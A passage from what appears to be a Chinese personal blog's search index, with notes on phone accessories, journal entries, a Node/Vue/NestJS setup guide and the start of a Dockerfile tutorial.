","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:5:2","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#手机膜类型"},{"categories":["blog"],"content":" 其他 厚度尽量低 疏油层和顺滑度相关, 多数都差不多. 青盾 6 铁兔 6 赤甲 6 图拉斯 6 邦克仕 6 亿色 6 ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:5:3","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#其他"},{"categories":["blog"],"content":" 推荐 参考 这期视频 选择推荐: 青盾 铁兔 赤甲 图拉斯 邦克仕 亿色 闪魔呢?! 参考一下 ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:5:4","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#推荐"},{"categories":["blog"],"content":" 言论磁吸对手机影响不大. 本人实测巴掌大的大块磁铁 (看风水用的, 放个勺子上去会走的那种), 在 10 厘米左右会对指南针有影响, 提示变化手机角度, 通过计算来规避磁场影响. 有数据证明影响不大, 文章似乎是绿联写的. 磁铁对手机有什么影响？无线充电会干扰信号？很多人理解错了|磁场|指南针|电磁场_网易订阅 (163.com) 用安卓是工作，用iPhone才是生活？？？_哔哩哔哩_bilibili iphone 的缺点说的很好 ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:6:0","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#言论"},{"categories":["blog"],"content":" 其他","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:7:0","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#其他-1"},{"categories":["blog"],"content":" 店铺 购买商品可以参考. 电丸科技 item.htm, 先看评测 item.htm, 影视飓风 item.htm, 微积分 item.htm 都有店子. 手机壳 + 保护膜 ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:7:1","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#店铺"},{"categories":["blog"],"content":" AirTag AirTag 精织斜纹钥匙扣 - 黑色 - Apple (中国大陆) ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:7:2","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#airtag"},{"categories":["journal"],"content":"2023-09-06 日记","date":"2023-09-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-06/","series":null,"tags":["journal"],"title":"2023-09-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-06/"},{"categories":["journal"],"content":"#lines 买二手房支出计算 买房最少有 1% 的契税 贷款服务费 1% 商贷利率支出 中介费 1.6% 或 1.4% 或 1.2% 评估担保 400 ","date":"2023-09-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-06/:0:0","series":null,"tags":["journal"],"title":"2023-09-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-06/#"},{"categories":["blog"],"content":"这里记录前端的迅速上手. 可能十年前这里记录的是 [jQuery](https://jquery.com/) 相关的技术, 而现在记录比较更现代的技术.","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["blog"],"content":" 简介这里记录前端的迅速上手. 可能十年前这里记录的是 jQuery 相关的技术, 而现在记录比较更现代的技术. ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:1:0","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#简介"},{"categories":["blog"],"content":" 基础使用","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:0","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#基础使用"},{"categories":["blog"],"content":" 安装 fnm 跨平台/速度快这里可以看到fnm比nvm快45倍, 而且跨平台. 所以我准备切换到 fnm 下载二进制 Releases · Schniz/fnm 放到 path 路径下 配置 bash/zsh/fish 的环境变量 # 使用特定的源 export FNM_NODE_DIST_MIRROR=https://mirrors.ivolces.com/nodejs-release/ # 或者 --node-dist-mirror https://mirrors.aliyun.com/nodejs-release/ # 安装lts版本 fnm install --lts # 查看 fnm ls # 使用特定版本 fnm use default fnm use v20.11.1 # 当前使用 fnm current nvm/用的人多/久经考验下载 nvm-windows 管理不同 nodejs 的版本 # 展示可用的版本 nvm list available # 安装指定大版本 nvm install 18 # 指定小版本 nvm install 18.16.0 # 使用版本 nvm use 18.16.0 # 已安装的版本 nvm list # 不推荐使用winget，经常版本切换的情况下 # 安装nodejs稳定版 winget install OpenJS.NodeJS.LTS ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:1","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#安装"},{"categories":["blog"],"content":" 安装 fnm 跨平台/速度快这里可以看到fnm比nvm快45倍, 而且跨平台. 所以我准备切换到 fnm 下载二进制 Releases · Schniz/fnm 放到 path 路径下 配置 bash/zsh/fish 的环境变量 # 使用特定的源 export FNM_NODE_DIST_MIRROR=https://mirrors.ivolces.com/nodejs-release/ # 或者 --node-dist-mirror https://mirrors.aliyun.com/nodejs-release/ # 安装lts版本 fnm install --lts # 查看 fnm ls # 使用特定版本 fnm use default fnm use v20.11.1 # 当前使用 fnm current nvm/用的人多/久经考验下载 nvm-windows 管理不同 nodejs 的版本 # 展示可用的版本 nvm list available # 安装指定大版本 nvm install 18 # 指定小版本 nvm install 18.16.0 # 使用版本 nvm use 18.16.0 # 已安装的版本 nvm list # 不推荐使用winget，经常版本切换的情况下 # 安装nodejs稳定版 winget install OpenJS.NodeJS.LTS ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:1","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#fnm-跨平台速度快"},{"categories":["blog"],"content":" 安装 fnm 跨平台/速度快这里可以看到fnm比nvm快45倍, 而且跨平台. 所以我准备切换到 fnm 下载二进制 Releases · Schniz/fnm 放到 path 路径下 配置 bash/zsh/fish 的环境变量 # 使用特定的源 export FNM_NODE_DIST_MIRROR=https://mirrors.ivolces.com/nodejs-release/ # 或者 --node-dist-mirror https://mirrors.aliyun.com/nodejs-release/ # 安装lts版本 fnm install --lts # 查看 fnm ls # 使用特定版本 fnm use default fnm use v20.11.1 # 当前使用 fnm current nvm/用的人多/久经考验下载 nvm-windows 管理不同 nodejs 的版本 # 展示可用的版本 nvm list available # 安装指定大版本 nvm install 18 # 指定小版本 nvm install 18.16.0 # 使用版本 nvm use 18.16.0 # 已安装的版本 nvm list # 不推荐使用winget，经常版本切换的情况下 # 安装nodejs稳定版 winget install OpenJS.NodeJS.LTS ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:1","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#nvm用的人多久经考验"},{"categories":["blog"],"content":" 基础配置 # 配置镜像源 npm config set registry https://registry.npmmirror.com # 加速二进制文件下载 npm i --registry=https://registry.npmmirror.com --disturl=https://npmmirror.com/dist # 这个节省磁盘,速度快。更新也是一样的命令，降级用pnpm@1.1.1这样 npm i -g pnpm # 安装ts npm i -g typescript # web框架 npm i -g @nestjs/cli # 查看全局安装的包 npm list -g ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:2","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#基础配置"},{"categories":["blog"],"content":" 示例项目 VUE 官网版本快速上手 | Vue.js (vuejs.org) # 创建项目,默认叫vue-project pnpm create vue@latest [vue-project] # 启用ts,vue-router,pinia,eslint,prettier,extension for debug # 禁用jsx,vitest,end to end test # 进入文件夹 cd vue-project # 安装依赖 pnpm i # 启动 pnpm run dev # 构建html,输出内容在dist内 pnpm run build # 查看是否有过期的包 pnpm outdated # 更新包,加上--dev可以更新开发依赖 pnpm update Nuxt 版本nuxt 是 vue 的全家桶。同时通过约定大于配置，帮助迅速开发。 Installation · Get Started with Nuxt # 创建项目 pnpm dlx nuxi@latest init nuxt-project Nestjs 版本Nestjs 是 nodejs 服务端的 web 框架 # 新建项目 nest new nest-project ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:3","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#示例项目"},{"categories":["blog"],"content":" 示例项目 VUE 官网版本快速上手 | Vue.js (vuejs.org) # 创建项目,默认叫vue-project pnpm create vue@latest [vue-project] # 启用ts,vue-router,pinia,eslint,prettier,extension for debug # 禁用jsx,vitest,end to end test # 进入文件夹 cd vue-project # 安装依赖 pnpm i # 启动 pnpm run dev # 构建html,输出内容在dist内 pnpm run build # 查看是否有过期的包 pnpm outdated # 更新包,加上--dev可以更新开发依赖 pnpm update Nuxt 版本nuxt 是 vue 的全家桶。同时通过约定大于配置，帮助迅速开发。 Installation · Get Started with Nuxt # 创建项目 pnpm dlx nuxi@latest init nuxt-project Nestjs 版本Nestjs 是 nodejs 服务端的 web 框架 # 新建项目 nest new nest-project ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:3","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#vue-官网版本"},{"categories":["blog"],"content":" 示例项目 VUE 官网版本快速上手 | Vue.js (vuejs.org) # 创建项目,默认叫vue-project pnpm create vue@latest [vue-project] # 启用ts,vue-router,pinia,eslint,prettier,extension for debug # 禁用jsx,vitest,end to end test # 进入文件夹 cd vue-project # 安装依赖 pnpm i # 启动 pnpm run dev # 构建html,输出内容在dist内 pnpm run build # 查看是否有过期的包 pnpm outdated # 更新包,加上--dev可以更新开发依赖 pnpm update Nuxt 版本nuxt 是 vue 的全家桶。同时通过约定大于配置，帮助迅速开发。 Installation · Get Started with Nuxt # 创建项目 pnpm dlx nuxi@latest init nuxt-project Nestjs 版本Nestjs 是 nodejs 服务端的 web 框架 # 新建项目 nest new nest-project ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:3","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#nuxt-版本"},{"categories":["blog"],"content":" 示例项目 VUE 官网版本快速上手 | Vue.js (vuejs.org) # 创建项目,默认叫vue-project pnpm create vue@latest [vue-project] # 启用ts,vue-router,pinia,eslint,prettier,extension for debug # 禁用jsx,vitest,end to end test # 进入文件夹 cd vue-project # 安装依赖 pnpm i # 启动 pnpm run dev # 构建html,输出内容在dist内 pnpm run build # 查看是否有过期的包 pnpm outdated # 更新包,加上--dev可以更新开发依赖 pnpm update Nuxt 版本nuxt 是 vue 的全家桶。同时通过约定大于配置，帮助迅速开发。 Installation · Get Started with Nuxt # 创建项目 pnpm dlx nuxi@latest init nuxt-project Nestjs 版本Nestjs 是 nodejs 服务端的 web 框架 # 新建项目 nest new nest-project ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:3","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#nestjs-版本"},{"categories":["blog"],"content":" Vscode 安装插件 Iconify IntelliSense - Iconify 图标插件 windicss IntelliSense - windicss 提示插件 I18n-ally - i18n 插件 Volar - vue 开发必备 ESLint - 脚本代码检查 Prettier - 代码格式化 Stylelint - css 格式化 DotENV - .env 文件 高亮 TypeScript Vue Plugin (Volar) - 用于让 TS 识别 *.vue 文件。 调试传统 web 项目的 launch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"type\": \"node\", \"request\": \"launch\", \"name\": \"启动程序\", \"runtimeExecutable\": \"pnpm\", \"runtimeArgs\": [ \"run\", \"start:dev\" ], \"console\": \"integratedTerminal\" } ] } typescript 的 launch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"type\": \"node\", \"request\": \"launch\", \"name\": \"启动程序\", \"preLaunchTask\": \"tsc-build\", \"program\": \"dist/main.js\" } // 终端运行 tsc --watch , 就不需要preLaunchTask了 // { // \"type\": \"node\", // \"request\": \"launch\", // \"name\": \"启动程序\", // \"program\": \"dist/main.js\" // } ] } 配合这里使用 tasks.json { \"version\": \"2.0.0\", \"tasks\": [ { \"type\": \"typescript\", \"tsconfig\": \"tsconfig.json\", \"problemMatcher\": [\"$tsc\"], \"group\": { \"kind\": \"build\", \"isDefault\": true }, \"label\": \"tsc-build\" } ] } ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:4","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#vscode"},{"categories":["blog"],"content":" Vscode 安装插件 Iconify IntelliSense - Iconify 图标插件 windicss IntelliSense - windicss 提示插件 I18n-ally - i18n 插件 Volar - vue 开发必备 ESLint - 脚本代码检查 Prettier - 代码格式化 Stylelint - css 格式化 DotENV - .env 文件 高亮 TypeScript Vue Plugin (Volar) - 用于让 TS 识别 *.vue 文件。 调试传统 web 项目的 launch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"type\": \"node\", \"request\": \"launch\", \"name\": \"启动程序\", \"runtimeExecutable\": \"pnpm\", \"runtimeArgs\": [ \"run\", \"start:dev\" ], \"console\": \"integratedTerminal\" } ] } typescript 的 launch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"type\": \"node\", \"request\": \"launch\", \"name\": \"启动程序\", \"preLaunchTask\": \"tsc-build\", \"program\": \"dist/main.js\" } // 终端运行 tsc --watch , 就不需要preLaunchTask了 // { // \"type\": \"node\", // \"request\": \"launch\", // \"name\": \"启动程序\", // \"program\": \"dist/main.js\" // } ] } 配合这里使用 tasks.json { \"version\": \"2.0.0\", \"tasks\": [ { \"type\": \"typescript\", \"tsconfig\": \"tsconfig.json\", \"problemMatcher\": [\"$tsc\"], \"group\": { \"kind\": \"build\", \"isDefault\": true }, \"label\": \"tsc-build\" } ] } ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:4","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#安装插件"},{"categories":["blog"],"content":" Vscode 安装插件 Iconify IntelliSense - Iconify 图标插件 windicss IntelliSense - windicss 提示插件 I18n-ally - i18n 插件 Volar - vue 开发必备 ESLint - 脚本代码检查 Prettier - 代码格式化 Stylelint - css 格式化 DotENV - .env 文件 高亮 TypeScript Vue Plugin (Volar) - 用于让 TS 识别 *.vue 文件。 调试传统 web 项目的 launch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"type\": \"node\", \"request\": \"launch\", \"name\": \"启动程序\", \"runtimeExecutable\": \"pnpm\", \"runtimeArgs\": [ \"run\", \"start:dev\" ], \"console\": \"integratedTerminal\" } ] } typescript 的 launch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"type\": \"node\", \"request\": \"launch\", \"name\": \"启动程序\", \"preLaunchTask\": \"tsc-build\", \"program\": \"dist/main.js\" } // 终端运行 tsc --watch , 就不需要preLaunchTask了 // { // \"type\": \"node\", // \"request\": \"launch\", // \"name\": \"启动程序\", // \"program\": \"dist/main.js\" // } ] } 配合这里使用 tasks.json { \"version\": \"2.0.0\", \"tasks\": [ { \"type\": \"typescript\", \"tsconfig\": \"tsconfig.json\", \"problemMatcher\": [\"$tsc\"], \"group\": { \"kind\": \"build\", \"isDefault\": true }, \"label\": \"tsc-build\" } ] } ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:2:4","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#调试"},{"categories":["blog"],"content":" 语法","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:3:0","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#语法"},{"categories":["blog"],"content":" 模块 // 在*.d.ts文件中 // 引入函数,对象 import { WebDAVClient, WebDAVClientOptions } from \"./types.js\"; // 声明函数的接口,但是实现在别的模块或文件中 export declare function createClient(remoteURL: string, options?: WebDAVClientOptions): WebDAVClient; // 导出函数,说明createClient方法在factory.js中 export { createClient } from \"./factory.js\"; ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:3:1","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#模块"},{"categories":["blog"],"content":" 生态直接套模板 vben 太重了,模板不更新. 也是 tsx pure-admin 前 element 团队员工 - 模板永远同步 tdesign vite 更新不及时. 表格 tsx arco tsx 淘汰 ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:4:0","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#生态"},{"categories":["blog"],"content":" 问题处理","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:5:0","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#问题处理"},{"categories":["blog"],"content":" npm timing 卡住 # nuxt初始化的时候,如果npm -v版本高于6,就会卡柱 npx nuxi@latest init nuxt-project # 降级 npm install -g npm@6 不得不说前端的问题是真的多… 参考 这个问题 就会发现, 很多人都踩过坑. 但还是会浪费你的时间 ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:5:1","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#npm-timing-卡住"},{"categories":["blog"],"content":" fast-folder-size 安装报错 du64.exe not found at D:\\code\\js\\learn\\nuxt-project\\node_modules\\fast-folder-size\\bin\\du64.exe downloading du.zip from https://download.sysinternals.com/files/DU.zip if you have trouble while downloading, try set process.env.FAST_FOLDER_SIZE_DU_ZIP_LOCATION to a proper mirror or local file path 手动处理 # 下载文件,配置环境变量.重新运行命令 $env:FAST_FOLDER_SIZE_DU_ZIP_LOCATION = \"C:\\Users\\80542\\Downloads\\DU.zip\" ","date":"2023-09-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/:5:2","series":null,"tags":["blog","js","vue","前端"],"title":"前端迅速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E8%BF%85%E9%80%9F%E4%B8%8A%E6%89%8B/#fast-folder-size-安装报错"},{"categories":["journal"],"content":"2023-09-05 日记","date":"2023-09-05","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-05/","series":null,"tags":["journal"],"title":"2023-09-05","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-05/"},{"categories":["journal"],"content":"#fun 爱思助手是如何安装 app 的?中文版 和 英文版 ","date":"2023-09-05","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-05/:0:0","series":null,"tags":["journal"],"title":"2023-09-05","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-05/#"},{"categories":["blog"],"content":" 简介存放我如何编写 Dockerfile 以及一些构建示例. ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 构建工具 docker build 是最简单, 最普遍的构建方式. buildx 适用于跨平台构建，通过 –platform 参数可以 x86，arm 等架构构建 kaniko 适用于 rootless ，或无法访问 docker 守护进程的环境（容器内部构建） buildkid #todo/笔记 如何使用 docker buildx 构建跨平台 Go 镜像 | Shall We Code? ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#构建工具"},{"categories":["blog"],"content":" 构建细节","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#构建细节"},{"categories":["blog"],"content":" 构建传参 docker build -t 名字:哈希值-发版号 --build-arg filename=参数值 --build-arg a=b . ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#构建传参"},{"categories":["blog"],"content":" 构建分层划分 镜像名称 镜像作用 示例 说明 base 基础镜像层 FROM openjdk:8 AS base 多次使用, 统一底层镜像 build 构建层 FROM maven:3-jdk-8 AS build 专门构建使用，验证是否正确构建 publish 汇总部署层 FROM build AS publish 基于 build 层来生成最终构建物 final 最终镜像层 FROM base AS final 复用干净的 base 层，打包 image ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#构建分层划分"},{"categories":["blog"],"content":" 镜像文件夹 /app/src: 源码目录 /app/build: 构建物生成目录 /app/publish: 最终汇总目录. 把构建物移动过来, 同时下载一些必要的图片, 证书等等 /workload: final 运行的目录 ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:3:3","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#镜像文件夹"},{"categories":["blog"],"content":" add 和 copy 命令的区别 add 可以解压文件 copy 在 multistage 时，拷贝之前的文件 ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:3:4","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#add-和-copy-命令的区别"},{"categories":["blog"],"content":" 示例","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#示例"},{"categories":["blog"],"content":" 镜像基础环境 - 持续更新 ubuntu采用最新的 ubuntu LTS 版本 # jammy lts FROM ubuntu:22.04 # 避免对话式弹窗 ENV DEBIAN_FRONTEND=noninteractive # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 软件源和基础配置 RUN mv /etc/apt/sources.list sources.list.bak \u0026\u0026 \\ touch /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-updates main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb 